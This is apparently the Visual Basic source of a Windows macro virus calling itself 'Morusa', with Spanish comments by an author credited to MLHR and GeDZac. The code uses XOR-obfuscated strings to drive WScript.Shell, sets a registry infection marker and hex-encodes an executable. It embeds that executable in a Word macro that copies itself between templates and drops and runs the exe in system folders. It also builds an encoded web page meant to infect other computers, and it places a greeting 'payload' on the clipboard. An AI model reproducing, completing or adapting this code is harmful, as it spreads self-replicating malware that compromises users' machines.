Attribute VB_Name = "Module1"
'Apis para manejar el procedimiento para ver si se está ejecutando o no word
Public Const GW_CHILD = 5
Public Const GW_HWNDNEXT = 2
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function GetWindo Lib "user32" Alias "GetWindow" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public dirvir As String
Public pogidoc As String
Public dogidoc As String
Public mlhrvir As String 'virus encriptado
Public mostrarpayload As Boolean
Public wss, fso
Sub cargarwssyfso()
On Error GoTo err
 'Cargo los objetos siguientes:
 
 'Scripting.filesystemobject
 Set fso = CreateObject(d("6262416845765E6C562C776B5D66627A4177576E7D6158665077"))
 'Wscript.Shell
 Set wss = CreateObject(d("665250735C72432C626A546E5D"))
err:
End Sub
Function chkdo()
 'Checo si está o no infectado el sistema
 
On Error GoTo err
'HKLM\Software\Microsoft\Windows\Currentversion\MLHR
If wss.regread(d("794A7F4C6951586445755070545F7C6A51715D705D65465F646A5D675C74405F77714676516A40725076466D5A6A69497A4C64")) = "1" Then
 chkdo = True
Else
err:
'HKLM\Software\Microsoft\Windows\Currentversion\MLHR
'*****************************************************************************
 wss.regwrite d("794A7F4C6951586445755070545F7C6A51715D705D65465F646A5D675C74405F77714676516A40725076466D5A6A69497A4C64"), 1
End If
End Function

Public Function EstaWordejecutandose() As Boolean
'Esta función me sirve en este caso para ver si esta o no ejecutandose word
'por lo que si se estuviera ejecutando causaria errores al ejecutarse la macro
'y pues para evitarme este error hice esto.
Dim lngDeskTopHandle As Long
Dim lngHand As Long
Dim strName As String * 255
Dim lngWindowCount As Long
On Error GoTo err
'aki obtengo el nombre de las ventanas
lngDeskTopHandle = GetDesktopWindow()
lngHand = GetWindo(lngDeskTopHandle, GW_CHILD)
lngWindowCount = 1
Do While lngHand <> 0
     
     GetWindowText lngHand, strName, Len(strName)
     
     lngHand = GetWindo(lngHand, GW_HWNDNEXT)
     DoEvents
     If Left$(strName, 1) <> vbNullChar Then
        If InStr(1, Left$(strName, InStr(1, strName, vbNullChar)), "Microsoft Word") Then
           EstaWordejecutandose = True
           Exit Function
        End If
          lngWindowCount = lngWindowCount + 1
     End If
Loop
err:

End Function

Sub cargarvar()
'Cargo las variables para infeccion, por lo que tarda mucho es una deficiencia de
'este virus, tambien tengan en cuenta esto, Este virus esta destinado para antes
'del 14 de Febrero del 200X ja ja ja ja

Dim acaba As Boolean
Dim arch
Dim moruvir As String
Dim cont As Integer
Dim macro As String
'código del documento doc (Macro) después del exe
macro = "44696D20737472696E676172677320417320537472696E670D0A44696D20737472696E676172677A20417320537472696E670D0A44696D20737472696E676172676320417320537472696E670D0A44696D207369706F20417320426F6F6C65616E0D0A44696D207A69706F20417320426F6F6C65616E0D0A44696D206369706F20417320426F6F6C65616E0D0A44696D207A6E6E2041" & _
"7320426F6F6C65616E0D0A44696D207A6765636420417320426F6F6C65616E0D0A44696D2072657420417320537472696E670D0A44696D206672695F6C696C6920417320496E74656765720D0A44696D206A6D7020417320426F6F6C65616E0D0A44696D206672695F726F73610D0A44696D206672695F616472690D0A5365742066736F203D204372656174654F626A656374282273" & _
"6372697074696E672E66696C6573797374656D6F626A65637422290D0A53657420777373203D204372656174654F626A6563742822777363726970742E7368656C6C22290D0A536574206E6F726D61203D20776F72642E4E6F726D616C54656D706C6174652E564250726F6A6563742E5642436F6D706F6E656E74730D0A5365742062697269203D20776F72642E416374697665446F" & _
"63756D656E742E564250726F6A6563742E5642436F6D706F6E656E74730D0A4966206E6F726D612E4974656D2831292E4E616D65203C3E20226D6F7275736122205468656E0D0A4966206E6F726D612E4974656D2831292E436F64654D6F64756C652E636F756E746F666C696E6573203C3E2030205468656E20536574206672695F726F7361203D206E6F726D613A206672695F6C69" & _
"6C69203D206E6F726D612E4974656D2831292E436F64654D6F64756C652E636F756E746F666C696E65733A206A6D70203D2046616C73653A20476F546F20726F6C6C6F7665720D0A7265656C6E65673A0D0A536574206672695F726F7361203D206E6F726D610D0A536574206672695F61647269203D20626972690D0A6672695F6C696C69203D206672695F616472692E4974656D28" & _
"31292E436F64654D6F64756C652E636F756E746F666C696E65730D0A6A6D70203D2046616C73650D0A476F546F206E7473696574650D0A67656E3A0D0A6E6F726D612E4974656D2831292E4E616D65203D20226D6F72757361220D0A456C73650D0A496620626972692E4974656D2831292E436F64654D6F64756C652E636F756E746F666C696E6573203C3E2030205468656E205365" & _
"74206672695F726F7361203D20626972693A206672695F6C696C69203D20626972692E4974656D2831292E436F64654D6F64756C652E636F756E746F666C696E65733A206A6D70203D20547275653A20476F546F20726F6C6C6F7665720D0A7265656C7461633A0D0A536574206672695F726F7361203D20626972690D0A536574206672695F61647269203D206E6F726D610D0A6672" & _
"695F6C696C69203D206672695F616472692E4974656D2831292E436F64654D6F64756C652E636F756E746F666C696E65730D0A6A6D70203D20547275650D0A476F546F206E7473696574650D0A6163743A0D0A626972692E4974656D2831292E4E616D65203D20226D6F72757361220D0A456E642049660D0A4F6E204572726F7220476F546F206572726F720D0A7A69706F203D2054" & _
"7275650D0A737472696E6761726773203D206578650D0A476F546F2067617469746F0D0A616E615F706174793A0D0A7A69706F203D2046616C73650D0A657865203D20737472696E67617267730D0A737472696E6761726773203D2022353736393645364336463637364636453245363537383635220D0A7369706F203D2046616C73650D0A476F546F2067617469746F0D0A77696E" & _
"643A0D0A736970203D2066736F2E66696C656578697374732866736F2E6275696C64706174682866736F2E6765747370656369616C666F6C6465722830292C20737472696E676172677329290D0A496620736970203D2046616C7365205468656E0D0A4F70656E2066736F2E6275696C64706174682866736F2E6765747370656369616C666F6C6465722830292C20737472696E6761" & _
"7267732920466F722042696E6172792041732023310D0A5075742023312C202C206578650D0A436C6F73652023310D0A536574206D6C203D2066736F2E67657466696C652866736F2E6275696C64706174682866736F2E6765747370656369616C666F6C6465722830292C20737472696E676172677329290D0A7773732E52756E206D6C2E73686F7274706174680D0A456E64204966" & _
"0D0A45786974205375620D0A6572726F723A0D0A7A6E6E203D20547275650D0A737472696E6761726773203D202234443739343436463633373536443635364537343733220D0A7369706F203D20547275650D0A476F546F2067617469746F0D0A6D6964693A0D0A7369706F203D2046616C73650D0A737472696E6761726773203D2022353736393645373736463732363432453635" & _
"37383635220D0A6369706F203D20547275650D0A7A67656364203D20547275650D0A476F546F2067617469746F0D0A6964696D3A0D0A736970203D2066736F2E66696C656578697374732866736F2E6275696C64706174682866736F2E6765747370656369616C666F6C6465722830292C20737472696E676172676329290D0A496620736970203D2046616C7365205468656E0D0A73" & _
"6970203D2066736F2E66696C656578697374732866736F2E6275696C6470617468287773732E7370656369616C666F6C6465727328737472696E676172677A292C20737472696E676172677329290D0A496620736970203D2046616C7365205468656E0D0A4F70656E2066736F2E6275696C6470617468287773732E7370656369616C666F6C6465727328737472696E676172677A29" & _
"2C20737472696E67617267732920466F722042696E6172792041732023310D0A5075742023312C202C206578650D0A436C6F73652023310D0A536574206D6C203D2066736F2E67657466696C652866736F2E6275696C6470617468287773732E7370656369616C666F6C6465727328737472696E676172677A292C20737472696E676172677329290D0A7773732E52756E206D6C2E73" & _
"686F7274706174680D0A456E642049660D0A456E642049660D0A45786974205375620D0A67617469746F3A0D0A726574203D2022220D0A6A203D20310D0A5768696C65206A203C204C656E28737472696E6761726773290D0A2020617578203D204368722843496E7428222668222026204D696428737472696E67617267732C206A2C20322929290D0A2020726574203D2072657420" & _
"26206175780D0A20206A203D206A202B20320D0A2020446F4576656E74730D0A57656E640D0A4966207A6E6E203D2046616C7365205468656E0D0A20737472696E6761726763203D207265740D0A20737472696E6761726773203D207265740D0A456C73654966207A67656364203D2046616C7365205468656E0D0A20737472696E676172677A203D207265740D0A456C73650D0A20" & _
"737472696E6761726773203D207265740D0A456E642049660D0A4966207369706F203D2054727565205468656E0D0A476F546F206D6964690D0A456C73654966207A69706F203D2054727565205468656E0D0A476F546F20616E615F706174790D0A456C73654966206369706F203D2054727565205468656E0D0A476F546F206964696D0D0A456C73650D0A476F546F2077696E640D" & _
"0A456E642049660D0A45786974205375620D0A44696D2074616E670D0A6E7473696574653A0D0A5768696C65206672695F6C696C69203E20300D0A536574206B6974746965203D206672695F616472692E4974656D2831290D0A536574206B6974746965203D206B69747469652E436F64654D6F64756C650D0A706F636861636F203D206B69747469652E4C696E6573286672695F6C" & _
"696C692C2031290D0A5365742074616E67203D206672695F726F73612E4974656D2831290D0A5365742074616E67203D2074616E672E436F64654D6F64756C650D0A476F546F2074696765720D0A77696E6E69653A0D0A6672695F6C696C69203D206672695F6C696C69202D20310D0A57656E640D0A4966206A6D70203D2046616C7365205468656E0D0A476F546F2067656E0D0A45" & _
"6C73650D0A476F546F206163740D0A456E642049660D0A74696765723A0D0A74616E672E696E736572746C696E657320312C20706F636861636F0D0A476F546F2077696E6E69650D0A726F6C6C6F7665723A0D0A6672695F726F73612E4974656D2831292E436F64654D6F64756C652E44656C6574654C696E657320312C206672695F6C696C690D0A4966206A6D70203D2046616C73" & _
"65205468656E0D0A476F546F207265656C6E65670D0A456C73650D0A476F546F207265656C7461630D0A456E642049660D0A456E6420537562"

dogidoc = decontirver(macro)
mlhrvir = encvir
moruvir = mlhrvir 'para no volver a convertir el exe
                               'C:\Windows\System32\asurom.dll
 Set arch = fso.createtextfile(fso.buildpath(fso.getspecialfolder(1), d("507246735A6F19665D6E")))
 'arch.writeline "Private Sub Document_Close()" & vbCrLf & "Dim exe As String"
 arch.writeline d("61735A775476522262775322756C52765F665C776D405E6C40661B2A") & vbCrLf & d("75685E21507A5222707111514571586D55")
 'arch.writeline "exe = " & Chr(34) & Mid(mlhrvir, 1, 200) & Chr(34) & " & _"
 arch.writeline d("547956210822") & Chr(34) & Mid(mlhrvir, 1, 200) & Chr(34) & " & _"
 mlhrvir = Mid(mlhrvir, 201, Len(mlhrvir))
 cont = 1
 'Parto el exe para poder escribirlo en C:\Windows\System32\asurom.dll y poder
 'utilizarlo en la macro
While Not acaba
   If cont = 8 Then
     arch.writeline Chr(34) & Mid(mlhrvir, 1, 200) & Chr(34)
     mlhrvir = Mid(mlhrvir, 201, Len(mlhrvir))
     If Len(mlhrvir) <= 200 Then
      arch.writeline Chr(34) & Mid(mlhrvir, 1, Len(mlhrvir)) & Chr(34)
      acaba = True
     End If
     arch.writeline "exe = exe & " & Chr(34) & Mid(mlhrvir, 1, 200) & Chr(34) & " & _"
     mlhrvir = Mid(mlhrvir, 201, Len(mlhrvir))
     cont = 1
   Else
     arch.writeline Chr(34) & Mid(mlhrvir, 1, 200) & Chr(34) & " & _"
     mlhrvir = Mid(mlhrvir, 201, Len(mlhrvir))
     If Len(mlhrvir) <= 200 Then
      arch.writeline Chr(34) & Mid(mlhrvir, 1, Len(mlhrvir)) & Chr(34)
      acaba = True
     End If
   End If
   DoEvents
   cont = cont + 1
Wend
 arch.writeline dogidoc '//Escribo el código de la macro
 arch.Close '//cierro el código del documento C:\Windows\System32\asurom.dll
 
 'Codigo de la página Web
 pogidoc = d("0D5250735C7243227D635F65446256660F2444616160406A4377143D3E09576A59244E6557635160380E4F65566350600B245870012C143273327133053302330232002618093B42446A5270586B5F245C6145615E7658705E5B5F71062D5F71062C3C0F756C5C2543733C0F5B250C257D605F2D4B645262546118083B435E77126C1238123412515D257E605C2D5C71052C3F0F5134" & _
"123812485B611A6B46321E255B2912341B08386600250F257F6C562D4864516257611E25582912341B08394C552541731338135141705625676D566B1308396F1338136F132E13343E0F7669406013253E0F59250E2559251E25020839405D62134F550B394F552659113C134D506C1F7850615667552A11575A665C2358230F2359231E2302391371422409247265587750093F4D53" & _
"245F240B240624626C536A176E173917350D24437211391150437154093B695470546B436D456B6E6A4533113911685471546A436C456A6E6B4532112311465977194442661966002C115D5E77114442661966002C1B08384B577D460838405C611243476B51715B6A5C083843476B51715B6A5C255C71052D4A2C3F0F766C5F2558253F0F766C5F2553713F0F58250F25030839525B" & _
"6C5F60136F13391349566B1B7D1A25096447250E25706D412D416101731B485A611B7D1F25592913371A2C1A3F5D7104250E265D72042615265272095B210E215F221C22033866675F670B465C671245476D51775A6C5D0E3950466114765163390E5B6A156147765A76157653774369532458614F703A0E456C5B691139112603410040043102330040004201360040043603330032" & _
"0135013500430144054103360144014401340640063C0233004101340040003C054302340247003501320730064306430643034302350341023400430332033503310240033D023403470735053D053C0135034403460346033C0641003701400730064007360636004406320641064106430737073007360734043D043D014603370336024603330630013300350630074307430747" & _
"0130063207340733073507350733070334763705340030723375337333013305360733033270330A3777360136013603360434033505360534743474377135723572340531073372337137063407340235743573310334013400357235093103310330753077300030033708350534723506340736023474350935723506350634703506357230013303330637743502347135043505" & _
"30013406350334733474350035003000310A3001300335043476350B340B34733577350234023774347734713403347635003477350234063502377534703400340735053576350B360030033006300030073104310130753076310236043501300A31023100310631013100300733723001310B3502377200440634044001300735033B013500450736023305460545003503350333" & _
"07470540053304350341023D0732043304460240063406370745073302370341023102350040013C01470046003302450035003D003400350046053105430337004700330134004601330041013C003C053601460043003400430044003204350533043504320033033107300141034602340737023702340230034107460237034003440133034102340236023D0246023307410135" & _
"01410033013306360641013D01340137063C063601360337023300430734074101370137063C063600430033064007430240073107430133024102330241043D043E014703370243034704773675330533013200370332073775360237743303367032073205330236723277350D340D3002337333733700357634013104340330723107307130763102360635723104300231743201" & _
"32063575350634003102307431043573310036743509347336073703367237003600370535743500340935703070370136013077300734013471340A34743502347430073007300134743000310B3176340A34763476340A307430013005367735733470350A35013002300B300131003071327433063475350B34713001310B30003472307137023572340A370A360B367737043604" & _
"3706340734763472350B310636723602300A3000370136053604377736010131074700360237003B0431043004310342034502310231064606360632003105320535044505410441063D0634064505410335033D033602410330013401310134003401330437053C04360132053702410145013202350330024603320233023C0146013400440032044102400243043C043701400040" & _
"003D00410041003D073607300730033D06430647064103440235034403400743073007350036023D0347024403400732074306370746054304300036023D03320233053D053C013302470233074301310347110839604B605070476013685671566A416C476A6C6B47321B6B47321B775B695E2C1A08396652695F255169517543695D6C520B39546F5721467755223C0877775F6045" & _
"6A5D6D12715631442B416C5F2A3E09416706721439142C5576412C786D512C476B5A2816351A24072D1E241D2406321E241A245076452C7C6D552C436B5D2811361D24002D18093B415F601143446B5271586A5F083B43446B5271586A5F255077452D5D2C3C0F62605D6052711146507657255E08384653765725516D402D043C1B3F12644071123812340608384653765725516D40" & _
"2D04331B3F12644071123812340308384653765725516D402D04321A3F13644171133813340108394652765625506D412D05301A3F13644171133813340308394652765625506D412D053D1A3F13644172133B1337000B394552426413625D701F35012B0B22507145230F2303363F097162406613465F705623390E5576402409247C6A412C592D380E736A522465615A6154703A0E" & _
"726A532477715F67456D5E6A3C0E57715F67456D5E6A11695E76447750093B6650695D25436056083B605F611163446B5271586A5F083B76446711675E6742755E6B5B643F0F566C5F2556723F0F4160462556721238126640605371576A506F5766462D5C71052D10320533743200330637773303320232023371330B330133033206330A33753376271A2C3E0F446D5A6956255772" & _
"1338132711083922576A5673566B47763E0F44605D613E0F57721D415C664668566B47751D4757623E0C5A601355761D6F5A705A635D76546F416F5077572D644162715D695660472D6541706C59745B6A516A40771B6D4161582C042D186A576953240B244D6554635260177059615F243C0E55731F405E674469546A45771960462A5067456D4760556A52705C605F711F6B506854" & _
"2C1F465D6A42601163506942603C0F55721F74446C450838604A6C46254170500838605C61126C54083861452B7C6A4068536946605F755E6446601C537055406A586051711C7350665D68426A5C605C71412B7B7157681B341A2B506A57605E6A57705F601D64576155775C684071416C5D62132D436447775A665A6A1A083961442B7D6A4168526967605E765F6747631D75527056" & _
"3C0B57761B465861446F546C45701967452D5360466A4466576C50765E665D771A6A5569512D1A47596B46611562546845613B0E52731875426D43093D6159601177446611243C0E57715F67456D5E6A11745070436D526D5E093B6852250C255F71062D13")

pogidoc = pogidoc & macro & Chr(34) & d("18") & vbCrLf
pogidoc = pogidoc & d("546F582108225976062A1337013403350B34043503340635063103360034063506360430003272320633003271320032733302317030053274327133043202360936082618241724476672767D621122116A453319260530073D074103350730063D07300335053406360335043606310637073C07400732132C1123117353464049540838604A6012381227") & moruvir & _
Chr(34) & vbCrLf & d("41734721082215674967113F1166496612251221122512405B711B30072A132514495D601C614C6119240428153605341F241024756C442C04301E241124152417246E26112211725347434857093B614961113911495860196149601D25033500291149" & _
"546B19604960182C3C0F526A5F71113811343C0F666D586954257F6A4625536653675308384C5425516A5C711238123D12515A605C0838754071123812754071122312465A771A36062C122312485B611A604A601E250329123702351A251525706D412D" & _
"00311A251525456770777F633E0F567D56250E257E6C572D567D5629133703341F257F605D2D567D562C1A08394F55267F635D2E567E5618210F3C15300732115659675F0E3B734077123E12734077132513405B711B30002D142214495D601D614D6119" & _
"2404281648536A1E614E611E2D172217475F761937052D112211725347434857093B655265536511391150437154083B405F61114C57083B75437111381175437111231127547D54250C25547D5425172513251425716D402D01311B2514257F6C562D57" & _
"7D572912341E250035022C122312465A771A36062C122312271223125A10251425446771777E633F0F577D57250F257E6C572D567D5629133703341F257F605D2D567D562C1A0839665C6B47250E25020839405F76560839754171133813754171132313" & _
"455B741B35072F1320137C685729507A522E11331D220333012A122512405A711A30072A132513211325145B16241224426676767962380E507C53240B247B6D522C527C5228173607351D247D615F2C547C542D18093B4D57247D615F2C547C542D1138" & _
"0C2503350125656D546B3C0F417745250C25417745251725726D432D0231182517257C6C552D577D572912341E257E605C2D577D572C1B251425716D402D01311B251425446771777E633F0F5366536753250F25667747603F0F776B56257B633F0F776B" & _
"56257A633E0F506A5D71133813665C6B4725182502083952566B570839755271416C506C5C250E25566B582515254377472515255E663E0C5668572655735D6547586E5D0C3F3E187152705872453D")
'ultimo corte del codigo


' d ("627451214767500F3B70596E5C230C2310317732763607300432773275330132703106360335023405340535733474307236053477347734063372330E370135753400357435083077370037733601370631043077307730773577350134753500377734063401340535743409350034733001320932083601347034723472340B3176370036773007317730013001367330053076307630743100310731013103320A320A3771350035013471350430073704360230073174317431703707300431013106310031003106310130763303330437703477347135033504300635023471350A31773001300130043703350434023703367236723577377737770132063002470044023301320130004603410731023302320240023B063106310040004200350036073D053004470533073205370741063C0747073307330645013301470434073607330341013400470132013304370030013500440043013701370437053D0436043401330041013C003C00440140013500350343004000460334034102370340023503310234004303460336033102330240023D013607350730073607310632063707430740063401320237073C06340636063006370636063106440537043D0034024402400" & _
'"630024705370532013C03330243063003350440044300330333033507410241023203340440043F013002310244074203013" & _
'"1003074320037023674370430003276330A33713270320430723202320A320435053576300130733607357735033407357534003572340E350E3004347435773500357735703506310130073201320636073505310437753572350030033503350035043475307235033474347036073475350035023509357235073075360236763704360431013176360A37033700300B300137013500340436743103317637003700300B300136743604307731743477310631743704347634043476320B320B377235023476357232753275370334053502300135053177300331753502307134073405350230723470340A350A31053275317535063770360433010134074500320344054304370334004007360630074604330534024702340332013700410131054601350641053C044605320436054704350435053007410735003C01450445033402340442043100370047003C00420134004204300430043600430437053C0541003D00410041003D044304360432024001440047013D01360735073C073606370746054304300343023D03470737063D07360344074700340244033C003C013D0141003201320030033103400344023D063001440134073C06360237033303320241033703350743" & _
'"06310630023C0636063606370244024303370337064006300634003702330234034402400243003F0036004700430600340A" & _
'"340737723605340134043301320233053601370A36013305370030763375340237053600377636023703370C3475340735773501317337723771310E310334743574350935753575350931023104310435093077307330753470350134703474307730043001370235093473357034743006307731033072327733043701350A340535043007340B3277327436053503350B317637043406273F0F577D5766477157255F6046605D775B715D5A5C71052D5C71052D406D5E681B2C3F0F50645F6913675C6740755C6B59643E0F566B5725407051253E0F75705D66476C5C6B13775737452D416A5F2C3E0F416101731338132E5274472E7E6F572E415E6D1F21042E1733182B11281132072A1228126240771A4E5A671B715C6F1F23062814351D2D390E706A512473715B67426D596A3B0E45715524556B5577476B5F6E50093B605869116046093B775470116046240C245276546545605E675B605271196B45321927063207430637073103400734063506350746073C073607340531043C04430440102C1B0838725A6C5E60126145250F2510273F0F566A5773576B46763F0F45605C613F0F56721C735B765B675E6012381271407057083861442B776A50705E605D71402B72615708396" & _
'"C552557721D6B5C775E645F71566843695271562B654763775C6F5666472B6547706A5E765C68566847751D6F47546C1B301" & _
'"C2C59635C67113F1179506055665623466B576D130E3967442D776C577159615A70472C51731B6556705C72536059674369536A432A59655A611E2A72685E77542457655D7754093B60462A407158703C0E547C5870117644673C0F546B552558633C0F55721F4B5E775C645D71546841695071542B674761775E6F5766462B4467516A5F755D6B576B46761C4C46605F2D032C1C665D6157685D614769572B53615663406A5F7646775B6B55251A755371406C516C5D2C3F0F56721D4B5C775E645F51566843695271562B406445603E0F57721D415C664668566B47761B61442B5266476C4560576A50705E605D711D68526B562F1D455F6940542155605971520F3B66462C407658773F09576D562341765123130E3945466D57705D6B5A245A70022C4D2D380E716D5B245C243B0E726D5A2456703A0E5D240C2400093B53596D5D61116E11381148546A197C18240B6545240C25726D432D4361037319485861197D1D255B291137182C183F5F7106250C255F71062517255371086F1238126F122E12370852576B563F776B562574705C66466C5D6B3F0F74705C66466C5D6B12685771576A406C466A6D6B46321A6B46321B0838415B6813774508396F13381349566B1B7F5266546057" & _
'"2C3E0F756A41255A250E250225676A1349566B1B6B47321A08396602250E257E6C572E5D72042A136F1F2602180C39620722" & _
'"0A227C6B552A4B62526457671E23582F12321A0E394A552341751439145046715124616C506A15093F6E1639166E162F16353A0E7268446117243C0E5B240C245B241C2400093B415F60114D57093B4D57245B240C257D605F2D4B64526254611825656D546B116F1138116F112811340B25437311381143506941603F0F7B63126F1238123512515A605C2558250F25033F127744250F25667747603F0F5F6046605D775B715D5A5C7105250F255F6046605D775B715D5A5C7104251525706D412D7276502D50341A256B6A41257276502D50371A2C3E0F7D604B713E0F766B572575705D66476C5C6B3E0F0F2A6065416F43720D")

 '**************************
' Open "c:\asdf.txt" For Binary As #2
' Put #2, , Trim(pogidoc)
' Close #2
 '****************************
End Sub
Function d(texto)
'Desencripta los códigos encriptados en este programa

j = 1
For i = 1 To Len(texto)

 If j > 255 Then j = 1
 If InStr(1, Str(j / 2), ".", vbBinaryCompare) Then
  c1 = Chr(Asc(Chr(CInt("&H" & Mid(texto, i, 2)))) Xor Asc(Oct(j)))
 Else
  c1 = Chr(Asc(Chr(CInt("&H" & Mid(texto, i, 2)))) Xor Log(j))
 End If
 i = i + 1
 j = j + 1
 d = d & c1
Next
End Function
Function encvir()
'Encripta el virus para ke lo pueda leer la macro o web page

Dim vir As String
Open dirvir For Binary As #3
'***********************************************************************
'Open "C:\proyecto1.exe" For Binary As #3
vir = Space(LOF(3))
Get #3, , vir
Close #3
encvir = contirver(vir)
End Function
Function contirver(txt As String)
'Encripta a hexadecimal para el codigo de la pagina, ya que el código guardado de
'la macro será utilizado en la página para poder infectar desde la página otras
'computadores con XP dejando a la dispocision el microsoft.word par introducir la
'macro con el exe virico

Dim i As Double
Dim aux As String
For i = 1 To Len(txt)
 aux = Hex(Asc(Mid(txt, i, 1)))
 If aux = "0" Then aux = "00"
 If Len(aux) = 1 Then aux = "0" & aux
 contirver = contirver & aux
 DoEvents
Next
End Function
Function decontirver(texto As String) As String
'Desencripta el texto que se introduzca a esta función
Dim j As Double
Dim aux As String

j = 1
While j < Len(texto)
  aux = Chr(CInt("&h" & Mid(texto, j, 2)))
  decontirver = decontirver & aux
  j = j + 2
  DoEvents
Wend

End Function
Function gap()
'Sirve para abrir y mandar convertir el archivo 'C:\Windows\System32\asurom.dll a
'hexadecimal y es asignado a gap

Dim piolin As String
         'C:\Windows\System32\asurom.dll
Open fso.buildpath(fso.getspecialfolder(1), d("507246735A6F19665D6E")) For Binary As #1
piolin = Space(LOF(1))
Get #1, , piolin
Close #1
gap = contirver(piolin)
End Function
Function mostrar()
'Este es el Payload que se menciona en Timer1

Clipboard.Clear
'Corporación MLHR (C) MMV
mostrar = d("726E41715A70566158F15F227C4F7951122B712A124E7F55") & vbCrLf & vbCrLf

'                               Iniciaremos la Primavera el 21
mostrar = mostrar & d("112113211522172211221122112311231223122312231223132313231323134A5A6D576D557651695A771568542465765F695772537657245268173606093D") & vbCrLf

'Saludos Especiales Para Ana Paty de Sinaloa, Dulce Beatriz R. V. de Gto, Juan Ramón
mostrar = mostrar & d("62605F74516D442274714167526A506F5770125353715323726D52236362477A14605124676D5A65596B54281540406855611646536542765E7E17561924612A1160542476705E28114E44655F2463655CF75F24") & vbCrLf
'                       Sáenz de la Mano Peluda, GeDZac Group, y a mis Friends
mostrar = mostrar & d("112113211522172211221122112311231223122312231250D2665D791367562358651449556A5B2465615971516519247161725E57671643456B42741B244E2450245C6D4224777658615F6042") & vbCrLf & vbCrLf


'                                              A T E N T A M E N T E:
mostrar = mostrar & d("112113211522172211221122112311231223122312231223132313231323132314241424142414241524152415247424622473247824622476247A24722479246524743E") & vbCrLf
'                                  %$+++++//#*---Morusa---*#\\+++++$%
mostrar = mostrar & d("1121132115221722112211221123112312231223122312231323132313231323142411201F2F1F2F1E2B1A271F2918297B6B447145651B291A2E14586B2F1C2F1A2F1521") & vbCrLf & vbCrLf


'            -->    http://mlhrcorporation.tripod.com     <--
mostrar = mostrar & d("1121132115221722112211221123112312231223122312231323132E1E3D132314245C7040740E2B1A69596C47675A76466B4465426D596A1970456D476B532A526B5C24112411240D291C") & vbCrLf
'                                   -->    http://www.gedzac.tk     <--
mostrar = mostrar & d("112113211522172211221122112311231223122312231223132313231323132314241429193A142415245D7041740F2B19734173186353604D65542A436F1724112411381C29") & vbCrLf
'                     -->    http://www.aquiserespiraelmiedo.com     <--
mostrar = mostrar & d("1121132115221722112211221123112312231223122E1F3D132313235B7747730E2B1B7343731A6544715C7750765077466D446553685B6D5260582A546B5A24112411240D291C")
Clipboard.SetText mostrar
End Function
